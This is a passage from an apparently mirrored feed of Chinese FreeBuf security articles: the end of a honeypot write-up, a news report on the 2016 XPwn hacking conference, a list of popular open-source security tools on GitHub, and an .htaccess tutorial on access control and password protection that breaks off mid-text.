<p><a href="http://image.3001.net/images/20160816/1471342793187.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20160816/1471342793187.png!small" alt="Clipboard Image.png"></a></p>
<p><a href="http://image.3001.net/images/20160816/14713427975480.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20160816/14713427975480.png!small" alt="Clipboard Image.png"></a></p>
<p>由上图可以看到攻击者在暴力破解成功后执行的命令，获取到这些恶意文件后进行分析，其大多数均为用于ddos的恶意程序，例如：</p>
<p><img src="http://image.3001.net/images/20160816/14713428022725.png!small" alt="Clipboard Image.png"><img src="http://image.3001.net/images/20160816/14713428057388.png!small" alt="Clipboard Image.png"></p>
<p>在长期收集蜜罐中的攻击者信息后，可以制定恶意IP列表直接在防火墙做阻断</p>
<p><strong>*本文作者：RipZ，转载须注明来自FreeBuf.COM</strong></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0-蜜罐分类：&quot;&gt;&lt;a href=&quot;#0-蜜罐分类：&quot; class=&quot;headerlink&quot; title=&quot;0.蜜罐分类：&quot;&gt;&lt;/a&gt;0.蜜罐分类：&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;低交互：模拟服务和漏洞以便收集信息和恶意软件，但是攻击者无法和该系统进行交
    
    </summary>
    
      <category term="freebuf" scheme="http://www.linux52.com/categories/freebuf/"/>
    
    
  </entry>
  
  <entry>
    <title>一起看看首届XPwn大会都破解了啥？</title>
    <link href="http://www.linux52.com/2016-09-09-e4-b8-80-e8-b5-b7-e7-9c-8b-e7-9c-8b-e9-a6-96-e5-b1-8axpwn-e5-a4-a7-e4-bc-9a-e9-83-bd-e7-a0-b4-e8-a7-a3-e4-ba-86-e5-95-a5-ef-bc-9f.html"/>
    <id>http://www.linux52.com/2016-09-09-e4-b8-80-e8-b5-b7-e7-9c-8b-e7-9c-8b-e9-a6-96-e5-b1-8axpwn-e5-a4-a7-e4-bc-9a-e9-83-bd-e7-a0-b4-e8-a7-a3-e4-ba-86-e5-95-a5-ef-bc-9f.html</id>
    <published>2016-09-09T03:26:43.000Z</published>
    <updated>2016-10-11T15:06:06.000Z</updated>
    
    <content type="html"><![CDATA[<ul>
<li>FreeBuf官方报道，作者/ArthurKiller，转载请注明来自FreeBuf（FreeBuf.COM）</li>
</ul>
<p><a href="http://image.3001.net/images/20160901/14726823437365.jpg" target="_blank" rel="external"><img src="http://image.3001.net/images/20160901/14726823437365.jpg!small" alt="592247857235212791.jpg"></a></p>
<p><strong>8月31日，第一届XPwn在北京召开。参赛选手成功攻破了小米，索尼，思科，极路由，西门子等众多厂商的相关硬件设备，查找到数十个安全漏洞，并且第一时间将破解方式和解决方案提供给相关厂商。本次大会有10组参赛选手，大会评委团则由国内外顶尖级安全专家与学者组成，分别来自蚂蚁金服、阿里巴巴、腾讯、百度等国内知名互联网公司，以及知名高校和网络安全研究团队。</strong></p>
<p>本次XPwn大会的主题为「未来安全，探索盛会」。在大会开场白的时候，XCon和 XPwn创始人王英键（网名呆神） 说到：“做安全就是做未来，我们需要重视安全，关注安全和了解安全。未来的安全是什么？它是以什么形态存在？它所具备的威胁是什么？发现问题和解决问题，这个是我们的目标，也是我们的责任。”</p>
<h2 id="XPwn：老牌安全会议XCON开“新花”"><a href="#XPwn：老牌安全会议XCON开“新花”" class="headerlink" title="XPwn：老牌安全会议XCON开“新花”"></a>XPwn：老牌安全会议XCON开“新花”</h2><p>xPwn是由XCon组委会主办，北京华永兴安科学技术有限公司承办的智能生活产品安全问题研究探索大会。今年将与XCon安全焦点安全技术峰会以及其他的一些安全活动联合举办。 通过xPwn吸引国内外一流的极客、黑客发现并解决智能设备上存在的安全问题，推动厂商及时修正问题，更加重视安全问题，探索更好的安全解决办法，从而提高产品安全质量。</p>
<p>XPwn2016总的奖金池500万人民币，并且部分获奖优秀选手，除了能获得奖金和荣誉外，组委会另设立一项独家奖励机制：导师+天使基金为破解技术提供孵化能力，让技术产品化、商业化，让好的技术和人才能够创造更大的价值获得更多的回报。XPwn的关注方向为智能终端，智能穿戴，智能家居，智能交通，生活O2O和未来安全。</p>
<p>XPwn的电子身份凭证有着一股强烈的极客范儿！</p>
<h2 id=""><a href="#" class="headerlink" title=""></a><a href="http://image.3001.net/images/20160901/14726747137475.jpg" target="_blank" rel="external"><img src="http://image.3001.net/images/20160901/14726747137475.jpg!small" alt="179009695476987169.jpg"></a></h2><p>XPwn大会上面两枚漂亮的欧洲“妹纸”，有着一种说不出的雅典风味。</p>
<p><a href="http://image.3001.net/images/20160901/14726749894966.jpg" target="_blank" rel="external"><img src="http://image.3001.net/images/20160901/14726749894966.jpg!small" alt="512774544646863899.jpg"></a></p>
<p>磁悬浮XPwn标志，“黑科技”味十足。</p>
<p><a href="http://image.3001.net/images/20160901/14726750806325.jpg" target="_blank" rel="external"><img src="http://image.3001.net/images/20160901/14726750806325.jpg!small" alt="177040463805313001.jpg"></a></p>
<p>在现场就坐的参会人员。</p>
<p><a href="http://image.3001.net/images/20160901/14726753032420.jpg" target="_blank" rel="external"><img src="http://image.3001.net/images/20160901/14726753032420.jpg!small" alt="123824213255053639.jpg"></a></p>
<p>XPwn大会上负责现场直播的美女主播们。</p>
<p><a href="http://image.3001.net/images/20160901/14726753682230.jpg" target="_blank" rel="external"><img src="http://image.3001.net/images/20160901/14726753682230.jpg!small" alt="374277052004757553.jpg"></a></p>
<p>XPwn前台接待人员</p>
<p><a href="http://image.3001.net/images/20160901/1472678712420.jpg" target="_blank" rel="external"><img src="http://image.3001.net/images/20160901/1472678712420.jpg!small" alt="758027661324424240.jpg"></a></p>
<h2 id="参赛细节"><a href="#参赛细节" class="headerlink" title="参赛细节"></a>参赛细节</h2><h3 id="智能家居设备（相关品牌：小米）"><a href="#智能家居设备（相关品牌：小米）" class="headerlink" title="智能家居设备（相关品牌：小米）"></a>智能家居设备（相关品牌：小米）</h3><p>小米的智能硬件生态包含多个智能设备，如智能插座、多功能网关等。为便于管理，小米为这些产品设计了一整套基础协议框架，统一实现设备接入、数据传输与控制管理。但是由于某个环节设计不当，导致小米的智能设备可被攻击者远程控制。小米相关负责人表示该漏洞目前已经修复，并且表达了对该研究人员的感谢。</p>
<p><a href="http://image.3001.net/images/20160901/14726767278249.jpg" target="_blank" rel="external"><img src="http://image.3001.net/images/20160901/14726767278249.jpg!small" alt="814375586570518326.jpg"></a></p>
<h3 id="路由器（相关品牌：ikuai，极路由和思科）"><a href="#路由器（相关品牌：ikuai，极路由和思科）" class="headerlink" title="路由器（相关品牌：ikuai，极路由和思科）"></a>路由器（相关品牌：ikuai，极路由和思科）</h3><p>在这个参赛环节，参赛人员展示了ikuai，极路由和思考三款路由器的漏洞利用。针对极路由的漏洞，用户只需点击攻击者编写的恶意网页，攻击者就可以获得路由器的SSH Shell权限。该漏洞涉及到csrf攻击，dns劫持，远程种马，远程获取root权限等。</p>
<p><a href="http://image.3001.net/images/20160901/14726774697149.jpg" target="_blank" rel="external"><img src="http://image.3001.net/images/20160901/14726774697149.jpg!small" alt="792668516346234141.jpg"></a></p>
<p>自从“影子经纪人”爆出NSA的泄露文件后，小编认为近几个月不再会有思科的0day出现。但是在XPwn大会上，Slipper和Kelwin展示了针对思考防火墙的命令执行漏洞，引起了众多评委的注意。</p>
<p><a href="http://image.3001.net/images/20160901/14726780893203.jpg" target="_blank" rel="external"><img src="http://image.3001.net/images/20160901/14726780893203.jpg!small" alt="674821066747585439.jpg"></a></p>
<h3 id="笔记本电脑（相关品牌：索尼）"><a href="#笔记本电脑（相关品牌：索尼）" class="headerlink" title="笔记本电脑（相关品牌：索尼）"></a>笔记本电脑（相关品牌：索尼）</h3><p>BIOS是电脑底层的一个操作系统，在XPwn大会上，404 Team研究人员发现索尼的BIOS系统对BIOS密码采用了64位RSA加密，非常容易遭到破解。专家评委王英键（呆神）评价道：“一般人的电脑都不会设置BIOS密码，但是如果有人对电脑设置BIOS密码，那么他们的电脑内一般都有非常重要的资料。”</p>
<p><a href="http://image.3001.net/images/20160901/1472679401364.jpg" target="_blank" rel="external"><img src="http://image.3001.net/images/20160901/1472679401364.jpg!small" alt="324129579757834285.jpg"></a></p>
<h3 id="贩卖机"><a href="#贩卖机" class="headerlink" title="贩卖机"></a>贩卖机</h3><p>在XPwn大会上，来自百度的小灰灰为我们展示了某贩卖机厂商的安全漏洞。据了解，该贩卖机占据了国内百分之八十的份额，漏洞危害十分广泛。这个参赛漏洞也是全场奖金最高的，该研究人员获得了十余万元人民币的奖金。该贩卖机采用了安卓系统对其进行控制，研究人员首先对控制APP进行了一个逆向分析，查找到了相关的接口和服务器地址，随后进行相关的漏洞挖掘。该贩卖机存在以下几个漏洞。</p>
<blockquote>
<p>漏洞一：支付逻辑漏洞</p>
<p>漏洞二：后台权限绕过访问</p>
<p>漏洞三：升级漏洞导致官方APP可被任意替换</p>
<p>漏洞四：大量敏感信息泄露</p>
<p>漏洞五：wifi劫持</p>
<p>漏洞六：3G/4G流量劫持</p>
<p>漏洞七：物理绕过<br><a href="http://image.3001.net/images/20160901/14726799586264.jpg" target="_blank" rel="external"><img src="http://image.3001.net/images/20160901/14726799586264.jpg!small" alt="919344873364759480.jpg"></a></p>
</blockquote>
<h3 id="工控4-0和交换机（相关厂商：西门子）"><a href="#工控4-0和交换机（相关厂商：西门子）" class="headerlink" title="工控4.0和交换机（相关厂商：西门子）"></a>工控4.0和交换机（相关厂商：西门子）</h3><p>XPwn参赛研究人员发现，西门子的工控4.0设备存在设计缺陷。研究人员展示了西门子PLC控制器之间的恶意代码传播。其次还有西门子的交换机存在漏洞，发送恶意数据包即可让交换机部分功能瘫痪。这个两个设备在工业控制领域十分广泛，其影响也不可忽视。</p>
<p><a href="http://image.3001.net/images/20160901/14726802806766.jpg" target="_blank" rel="external"><img src="http://image.3001.net/images/20160901/14726802806766.jpg!small" alt="649472093807709865.jpg"></a></p>
<h3 id="固件中的安全思考（相关品牌：锤子手机）"><a href="#固件中的安全思考（相关品牌：锤子手机）" class="headerlink" title="固件中的安全思考（相关品牌：锤子手机）"></a>固件中的安全思考（相关品牌：锤子手机）</h3><p>来自百度安全实验室的胡明现场演示了如何绕过锤子手机的底层固件，安装第三方系统。</p>
<p><a href="http://image.3001.net/images/20160901/14726807717236.jpg" target="_blank" rel="external"><img src="http://image.3001.net/images/20160901/14726807717236.jpg!small" alt="669445700015843287.jpg"></a></p>
<h2 id="大会亮点"><a href="#大会亮点" class="headerlink" title="大会亮点"></a>大会亮点</h2><h3 id="iOS-10-beta越狱演示"><a href="#iOS-10-beta越狱演示" class="headerlink" title="iOS 10 beta越狱演示"></a><strong>iOS 10 beta越狱演示</strong></h3><p>在大会上，犇众信息联合创始人陈小波（DM）现场演示了iOS 10 beta的越狱视频。通过演示视频，小编了解到他们首先是在iOS 10 beta上安装一个低权限的第三方APP。打开该APP后，它会通过相关iOS漏洞获得root权限，并且成功安装Cydia。</p>
<p><a href="http://image.3001.net/images/20160901/1472681014789.jpg" target="_blank" rel="external"><img src="http://image.3001.net/images/20160901/1472681014789.jpg!small" alt="820460690122143711.jpg"></a></p>
<h3 id="银行APP安全检测"><a href="#银行APP安全检测" class="headerlink" title="银行APP安全检测"></a>银行APP安全检测</h3><p>在现场，某位安全研究人员还演示了国内众多银行的APP漏洞。该研究人员首先是填写指定转款人姓名，联系方式，银行账户，短信验证码等常规操作。看似非常安全和正常的操作，但是到最后钱却转到了另外一个人的账户上。由于该漏洞过于敏感，会议上并没有披露漏洞的细节。</p>
<p><a href="http://image.3001.net/images/20160901/14726818316577.jpg" target="_blank" rel="external"><img src="http://image.3001.net/images/20160901/14726818316577.jpg!small" alt="439998310454631692.jpg"></a></p>
<h2 id="「极客奥运会」圆满落幕"><a href="#「极客奥运会」圆满落幕" class="headerlink" title="「极客奥运会」圆满落幕"></a>「极客奥运会」圆满落幕</h2><p>至此，XPwn已经圆满结束。人们生活对于互联网已经产生依赖，针对互联网安全研究的路上，需要各行各业的不懈努力。主办方介绍，XPwn更关注的不是发现隐患，而是消除隐患。XPwn希望通过这样的活动，联合极客圈的力量，为网络安全护航。</p>
<p><a href="http://image.3001.net/images/20160901/14726821946939.jpg" target="_blank" rel="external"><img src="http://image.3001.net/images/20160901/14726821946939.jpg!small" alt="20958907836330855.jpg"></a></p>
<p><strong>* FreeBuf官方报道，作者/ArthurKiller，转载请注明来自FreeBuf（FreeBuf.COM）</strong></p>
]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;FreeBuf官方报道，作者/ArthurKiller，转载请注明来自FreeBuf（FreeBuf.COM）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a href=&quot;http://image.3001.net/images/20160901/14726823437365
    
    </summary>
    
      <category term="freebuf" scheme="http://www.linux52.com/categories/freebuf/"/>
    
    
  </entry>
  
  <entry>
    <title>GitHub上10个最受欢迎的安全项目</title>
    <link href="http://www.linux52.com/2016-09-09-github-e4-b8-8a10-e4-b8-aa-e6-9c-80-e5-8f-97-e6-ac-a2-e8-bf-8e-e7-9a-84-e5-ae-89-e5-85-a8-e9-a1-b9-e7-9b-ae.html"/>
    <id>http://www.linux52.com/2016-09-09-github-e4-b8-8a10-e4-b8-aa-e6-9c-80-e5-8f-97-e6-ac-a2-e8-bf-8e-e7-9a-84-e5-ae-89-e5-85-a8-e9-a1-b9-e7-9b-ae.html</id>
    <published>2016-09-09T03:18:57.000Z</published>
    <updated>2016-10-11T15:06:06.000Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://image.3001.net/images/20160907/14732567998627.jpg" target="_blank" rel="external"><img src="http://image.3001.net/images/20160907/14732567998627.jpg!small" alt="1421819031148798.jpg"></a></p>
<blockquote>
<p>开源项目最终还是迎来了属于它的胜利，虽然这胜利姗姗来迟，但终究还是实现了。在信息安全领域，尽管许多公司封锁了它们的专有软件代码，但仍有许多开源项目可供安全专家使用。</p>
<p>其中，寻找开源安全相关项目的首选就是GitHub。你可以利用GitHub的搜索功能发现有用的工具，但是，GitHub有一个地方可以帮你获寻最热门的安全项目，就是所谓的GitHub Showcases板块，但是在 GitHub上，这个板块却鲜为人知。<br><strong>2014年开始，Showcases设立了最热门安全项目类别 。Showcases上罗列的项目主要按星级罗列，也就是说，通常列表显示的是当今 最流行的项目。</strong></p>
</blockquote>
<p>Showcases的“安全”类别包含24个项目。<strong>下面的项目为当下GitHub上最受欢迎的Top10 开源安全项目：</strong></p>
<h3 id="1-osquery-–-源自Facebook"><a href="#1-osquery-–-源自Facebook" class="headerlink" title="1. osquery – 源自Facebook "></a><strong>1. osquery – 源自Facebook </strong></h3><p><a href="https://github.com/facebook/osquery" target="_blank" rel="external"><strong>osquery</strong></a>是一个高性能关系数据库的操作系统，允许编写SQL查询，探索操作系统数据。借助osquery，SQL表格表现的是抽象概念，比如运行过程、加载的内核模式、开放的网络连接、浏览器插件、硬件事件或文件 hash。</p>
<h3 id="2-Metasploit-Framework-–-源自Rapid7"><a href="#2-Metasploit-Framework-–-源自Rapid7" class="headerlink" title="2. Metasploit Framework – 源自Rapid7 "></a><strong>2. Metasploit Framework – 源自Rapid7 </strong></h3><p><a href="https://github.com/rapid7/metasploit-framework" target="_blank" rel="external"><strong>Metasploit Framework</strong></a>是开发并执行针对远程目标设备漏洞利用代码的工具。</p>
<h3 id="3-Infer-–源自Facebook"><a href="#3-Infer-–源自Facebook" class="headerlink" title="3. Infer –源自Facebook "></a><strong>3. Infer –源自Facebook </strong></h3><p><a href="https://github.com/facebook/infer" target="_blank" rel="external"><strong>Facebook Infer</strong></a>是一款静态分析工具，如果你给Infer一些Objective-C、Java或C代码，它会生成一个潜在漏洞列表。在关键漏洞转移至用户手机之前，任何人都可以使用Infer拦截关键漏洞，并帮助防止死机或性能差。</p>
<h3 id="4-Brakeman-–-源自PresidentBeef"><a href="#4-Brakeman-–-源自PresidentBeef" class="headerlink" title="4. Brakeman – 源自PresidentBeef "></a><strong>4. Brakeman – 源自PresidentBeef </strong></h3><p><a href="https://github.com/presidentbeef/brakeman" target="_blank" rel="external"><strong>Brakeman</strong></a>是一个开源静态分析工具，负责检查Ruby on Rails应用程序的安全漏洞。</p>
<h3 id="5-Radare2-–-源自the-Radare项目"><a href="#5-Radare2-–-源自the-Radare项目" class="headerlink" title="5. Radare2 – 源自the Radare项目"></a><strong>5. Radare2 – 源自the Radare项目</strong></h3><p><a href="https://github.com/radare/radare2" target="_blank" rel="external"><strong>Radare</strong></a>是一个取证工具以及可编写脚本的命令行十六进制编辑器，可以打开磁盘文件、支持分析二进制、反汇编代码、调试程序以及连接到远程gdb服务器…</p>
<h3 id="6-OS-X-Auditor-–-源自Jean-Philippe-Teissier"><a href="#6-OS-X-Auditor-–-源自Jean-Philippe-Teissier" class="headerlink" title="6. OS X Auditor – 源自Jean-Philippe Teissier "></a><strong>6. OS X Auditor – 源自Jean-Philippe Teissier </strong></h3><p><a href="https://github.com/jipegit/OSXAuditor" target="_blank" rel="external"><strong>OS X Auditor</strong></a>是一个免费的Mac OS X计算机取证工具，负责分析多类型文件的可疑内容。</p>
<h3 id="7-BeEF-–-源自BeEF项目"><a href="#7-BeEF-–-源自BeEF项目" class="headerlink" title="7. BeEF – 源自BeEF项目 "></a><strong>7. BeEF – 源自BeEF项目 </strong></h3><p><a href="https://github.com/beefproject/beef" target="_blank" rel="external"><strong>BeEF</strong></a>是The Browser Exploitation Framework的缩写，它是一个 专注网页浏览器的渗透测试工具。</p>
<h3 id="8-Cuckoo-–-源自Cuckoo沙盒项目"><a href="#8-Cuckoo-–-源自Cuckoo沙盒项目" class="headerlink" title="8. Cuckoo – 源自Cuckoo沙盒项目 "></a><strong>8. Cuckoo – 源自Cuckoo沙盒项目 </strong></h3><p><a href="https://github.com/cuckoosandbox/cuckoo" target="_blank" rel="external"><strong>Cuckoo Sandbox</strong></a>是一个自动动态恶意软件分析系统。这意味着什么呢？简单来说就是，你可以将任何可疑文件丢给它，Cuckoo会在几秒内为你反馈一个详细结果，概括此类文件在在孤立环境中执行时的活动。</p>
<h3 id="9-Scumblr-–-源自Netflix"><a href="#9-Scumblr-–-源自Netflix" class="headerlink" title="9. Scumblr – 源自Netflix "></a><strong>9. Scumblr – 源自Netflix </strong></h3><p><a href="https://github.com/Netflix/Scumblr" target="_blank" rel="external"><strong>Scumblr</strong></a>是一个Web应用程序，允许执行定期搜索和存/取识别结果的行为。</p>
<h3 id="10-Moloch-–-源自AOL"><a href="#10-Moloch-–-源自AOL" class="headerlink" title="10. Moloch – 源自AOL "></a><strong>10. Moloch – 源自AOL </strong></h3><p><a href="https://github.com/aol/moloch" target="_blank" rel="external"><strong>Moloch</strong></a>是一个开源的，大规模的数据包捕获、索引和数据库系统。为PCAP浏览、搜索和导出提供了一个简单的Web接口。API接口都是公开的，允许直接下载PCAP数据和JSON格式的会话数据。通过使用HTTPS和HTTP摘要密码支持或通过使用前面的Apache实现安全。Moloch并不是为了取代IDS，而是与之合作，储存并索引标准PACP格式中的所有网络流量，提供快速访问。Moloch可以在多个系统部署，处理数万gigabits（G比特）/sec（秒）的流量。</p>
<p><strong>以上就是当前GitHub上最受欢迎的开源安全项目。您可以定期查看<a href="https://github.com/showcases/security?s=stars" target="_blank" rel="external">Showcases板块</a>， 了解最流行的项目及分析各类项目的变化趋势。</strong></p>
<p><strong>* 参考来源：<a href="http://news.softpedia.com/news/the-top-10-most-popular-security-projects-on-github-507934.shtml" target="_blank" rel="external">softpedia</a>，米雪儿编译，转载请注明来自FreeBuf.COM</strong></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;http://image.3001.net/images/20160907/14732567998627.jpg&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;img src=&quot;http://image.3001.net/images/
    
    </summary>
    
      <category term="freebuf" scheme="http://www.linux52.com/categories/freebuf/"/>
    
    
  </entry>
  
  <entry>
    <title>.htaccess教程：简介、访问控制、验证、目录浏览控制</title>
    <link href="http://www.linux52.com/2016-08-20-htaccess-e6-95-99-e7-a8-8b-ef-bc-9a-e7-ae-80-e4-bb-8b-e3-80-81-e8-ae-bf-e9-97-ae-e6-8e-a7-e5-88-b6-e3-80-81-e9-aa-8c-e8-af-81-e3-80-81-e7-9b-ae-e5-bd-95-e6-b5-8f-e8-a7-88-e6-8e-a7-e5-88-b6.html"/>
    <id>http://www.linux52.com/2016-08-20-htaccess-e6-95-99-e7-a8-8b-ef-bc-9a-e7-ae-80-e4-bb-8b-e3-80-81-e8-ae-bf-e9-97-ae-e6-8e-a7-e5-88-b6-e3-80-81-e9-aa-8c-e8-af-81-e3-80-81-e7-9b-ae-e5-bd-95-e6-b5-8f-e8-a7-88-e6-8e-a7-e5-88-b6.html</id>
    <published>2016-08-20T04:46:36.000Z</published>
    <updated>2016-10-11T15:06:06.000Z</updated>
    
    <content type="html"><![CDATA[<div class="text"><br><br>## 一、.htaccess简介<br><br>### 1.什么是.htaccess<br><br>.htaccess是一个纯文本文件，里面存放着Apache服务器配置相关的一些指令，它类似于Apache的站点配置文件，如httpd.conf（Apache2已经支持多站点，因此你的站点配置文件可能在/etc/apache2/conf.d/目录下）。<br>.htaccess与httpd.conf配置文件不同的是，它<strong>只作用于当前目录</strong>。另外httpd.conf是在Apache服务启动的时候就加载的，而.htaccess<strong>只有在用户访问目录时加载</strong>，开销大、速度慢。<br>既然如此，为什么我们还要用.htaccess呢？因为它配置起来简单，它还支持重定向、URL重写以及访问验证，另外它管理起来很方便，可以很好适应网站迁移。总之，各有优缺点，主要就看你是要从全局考虑还是只配置单个目录。<br><br>### 2.AllowOverride All<br><br>通常情况下，Apache是默认启用.htaccess的，但是为了以防万一，请检查一下自己站点的配置文件，如httpd.conf，是否有这行：<br><pre>AllowOverride All<br></pre><br>这行允许重写配置文件。也就是如果能够从.htaccess加载配置文件，那么就以.htaccess为配置文件对其所在目录进行配置。<br><br>### 3.500错误<br><br>如果你租用了云服务提供商的主机或者空间，那么他们可能不会给你读写httpd.conf文件的权限，你也不可能检查<strong>AllowOverride</strong>命令参数是否为<strong>All</strong>，这时，你可以新建一个目录，在里面写一个.htaccess文件，文件中随意写入一些服务器看不懂的东西，然后访问该目录里的一个页面，耐心等待<strong>500错误</strong>的出现。<br>如果没有出现，那么.htaccess没有被启用，你需要向你的服务供应商寻求帮助；如果出现了，那么恭喜你，你可以对当前目录重写Apache配置。<br><strong>/!\注意：</strong>.htaccess语法错误可能会影响整个站点，如果你不确定这样做是否安全，请联系你的云服务供应商。<br><br>### 4.有用的文档<br><br><em>   <a href="http://lesca.me/archives/htaccess-appendix.html#htaccess_regex" target="_blank" rel="external">.htaccess正则表达式</a>
</em>   <a href="http://lesca.me/archives/htaccess-appendix.html#redirect_codes" target="_blank" rel="external">HTTP协议重定向编码</a><br><br>## 二、.htaccess访问控制(Allow/Deny)<br><br>### 1.访问控制基础：Order命令<br><br>为了限制用户访问一些关键目录，.htaccess可以提供目录访问限制。你只需要在要限制的目录中，加入如下.htaccess文件：<br><pre># no one gets in here!<br>deny from all<br></pre><br>这会限制所有用户通过浏览器访问该目录，这太一刀切了，因此我们还可以增加一些特定的条件，如允许指定IP地址的访问：<br><pre>Order Allow,Deny<br>Deny from All<br>Allow from 192.168.0.0/24<br></pre><br><br>### Order命令<br><br>Order命令是一个难点，也是配置apache的基础，它决定了Apache处理访问规则的顺序。<br><br><em>   通过<strong>Allow,Deny</strong>参数，Apache首先找到并应用<strong>Allow</strong>命令，然后应用<strong>Deny</strong>命令，以阻止所有访问。
</em>   通过<strong>Deny,Allow</strong>参数，Apache首先找到并应用<strong>Deny</strong>命令，然后应用<strong>Allow</strong>命令，以允许所有访问。<br>了解Order的用法后，再仔细考虑下上面的例子，你或许能够发现<strong>Deny</strong>命令是多余的，以下用法和之前的描述语义相同：<br><pre>Order Allow,Deny<br>Allow from 192.168.0/24<br></pre><br><br>### 2.利用.htaccess过滤域名或网络主机(Allow/Deny)<br><br>下例可以限制所有含有“domain.com”的网络主机访问网站：<br><pre>Order Allow,Deny<br>Allow from all<br>Deny from .<em>domain.com.</em><br></pre><br><strong>{!}Info</strong>：有关htaccess的正则表达式用法，请查阅本站《<a href="http://lesca.me/archives/htaccess-appendix.html#htaccess_regex" target="_blank" rel="external">.htaccess正则表达式</a>》一文。<br><br>### 3.利用.htaccess禁止访问指定文件(Files)<br><br>Files命令可以用于过滤指定文件：<br><pre># secure htaccess file<br>&lt;Files .htaccess&gt;<br> order allow,deny<br> deny from all<br>&lt;/Files&gt;<br></pre><br><br>### 4.利用.htaccess禁止访问指定文件类型(FilesMatch)<br><br>下面的代码将限制访问所有.log和.exe文件：<br><pre>&lt;FilesMatch “.(log|exe)$”&gt;<br> Order allow,deny<br> Deny from all<br>&lt;/FilesMatch&gt;<br></pre><br>我们还可以通过<strong>Files</strong>命令描述文件类型，但是需要在命令后面加一个波浪线(~)，该符号启用Files命令的正则表达解析功能：<br><pre>&lt;Files ~ “^.<em>.([Ll][Oo][Gg])|([eE][xX][eE])”&gt;<br> Order allow,deny<br> Deny from all<br> Satisfy All<br>&lt;/Files&gt;<br></em></pre><br>有以下几点需要读者注意：

   Files之后的<strong>波浪线</strong>用于开启“正则表达式”分析。请注意，这是个过时的用法，Apache<a href="http://httpd.apache.org/docs/2.2/mod/core.html#files" target="_blank" rel="external">更推荐使用&lt;FilesMatch&gt;指令</a><sup>[3]</sup><br><em>   正则表达式必须在<strong>双引号</strong>之间，有关htaccess的正则表达式用法，请查阅本站《<a href="http://lesca.me/archives/htaccess-appendix.html#htaccess_regex" target="_blank" rel="external">.htaccess正则表达式</a>》一文。
</em>   双引号中的“管道符”(|)用于将两种文件类型（.log和.exe）分开，相当于逻辑“或”<br><em>   Order命令必须嵌在Files节(Section)中，否则将会应用到所有文件
</em>   <strong>Satisfy All</strong>表示必须同时满足主机级别(Allow/Denay)和用户级别(Require)的限制，All是默认值，该行可以省略。<br><br>### 5.高级访问控制(Rewrite)<br><br>我们还可以通过运用Rewrite实现更强大的访问控制，但是Rewrite不是本文讨论的内容。读者可以参看：<a href="http://lesca.me/archives/htaccess-rewrite.html#access_control" target="_blank" rel="external">利用RewriteCond和RewriteRule进行访问控制</a>一文。<br><br>## 三、利用.htaccess进行密码保护与验证<br><br>### 1.配置.htaccess<br><br><pre>AuthType Basic<br>AuthName “restricted area”<br>AuthUserFile /usr/local/var/www/html/.htpasses<br>require valid-user<br></pre><br>这个配置文件可以保护.htaccess所在的整个目录，简单说明下参数：<br><br><em>   <strong>AuthType：</strong>验证类型为基本类型，密码以<strong>明文</strong>方式传输到服务器上
</em>   <strong>AuthName：</strong>验证提示，会出现在验证对话框中<br><em>   <strong>AuthUserFile：</strong>验证配置文件，用于匹配用户名与密码，该密码是加密保存的
</em>   <strong>require valid-user：</strong>只有在AuthUserFile中出现的用户才可以通过验证<br>如果验证失败，则会出现<strong>401</strong>错误。<br><br>### 2.生成.htpasses文件<br><br>如何生成.htpasses文件呢？我们通过<code>htpasswd</code>命令生成密码文件：<br><pre>htpasswd -c /usr/local/var/www/html/.htpasses lesca<br></pre><br>它会提示你输入密码，并确认。之后将密码文件.htpasses保存在/usr/local/var/www/html/目录下。<br><br>### 3.对文件进行密码保护<br><br>保护与.htaccess在同一目录下的文件<strong>secure.php</strong>：<br><pre># password-protect single file<br>&lt;Files secure.php&gt;<br>AuthType Basic<br>AuthName “Prompt”<br>AuthUserFile /home/path/.htpasswd<br>Require valid-user<br>&lt;/Files&gt;<br></pre><br>保护.htaccess所在目录下的多个文件：<br><pre># password-protect multiple files<br>&lt;FilesMatch “^(execute|index|secure|insanity|biscuit)<em>$”&gt;<br>AuthType basic<br>AuthName “Development”<br>AuthUserFile /home/path/.htpasswd<br>Require valid-user<br>&lt;/FilesMatch&gt;<br></em></pre><br><br>### 4.对指定IP进行密码保护<br><br>仅允许IP地址为99.88.77.66的主机直接访问该目录，其他IP需要验证。<br><pre>AuthType Basic<br>AuthName “Personal”<br>AuthUserFile /home/path/.htpasswd<br>Require valid-user<br>Allow from 99.88.77.66<br>Satisfy Any<br></pre><br><br>### 5.安全性<br><br>出于安全考虑，将.htpasses文件存放在WEB目录树之外也许是个好方法，但是由于.htpasses是隐藏文件，而且Apache不会输出隐藏文件，因此可以满足基本的安全要求。这是通过在主配置文件中加入如下限制实现的：<br><pre>&lt;Files ~ “^.ht”&gt;<br> Order allow,deny<br> Deny from all<br> Satisfy All<br>&lt;/Files&gt;<br></pre><br>一般而言，这是默认设置，用户无需手动添加。我们唯一需要担心的是密码在网络传输过程中是<strong>明文</strong>形式，这很容易被黑客破译。Coz<sup>[1]</sup>提供了一个开源项目<a href="http://corz.org/serv/security/pajamas.php" title="php and javascript advanced md5 authentication system" target="_blank" rel="external">Pajamas</a>可以在本地利用JS对密码进行MD5加密，有兴趣的读者可以前去研究一下。<br><br>## 四、目录浏览与主页<br><br>如果你打开本站的下载页面<a href="http://download.lesca.me/" target="_blank" rel="external">http://download.lesca.me/</a>，就会发现你可以看见这个站点下的所有文件。像这样的特性也可以通.htaccess来设置用户是否有权限浏览服务器目录。<br><br>### 1.启用目录浏览<br><br><pre># enable directory browsing<br>Options All +Indexes<br></pre><br><br>### 2.禁用目录浏览<br><br><pre># disable directory browsing<br>Options All -Indexes<br></pre><br>我们还可以通过<strong>IndexIgnore</strong>指令来禁用目录浏览。<br><pre># prevent folder listing<br>IndexIgnore <br></pre><br>通过<strong>IndexIgnore</strong>指令，我们可以禁止对指定类型的文件浏览：<br><pre># prevent display of select file types<br>IndexIgnore <em>.wmv </em>.mp4 <em>.avi </em>.etc<br></pre><br><br>### 3.自定义目录浏览<br><br>如果你希望Apache在展示你的WEB目录时看起来与众不同，那么你需要启用<strong>FancyIndexing</strong>选项：<br><pre>&lt;IfModule 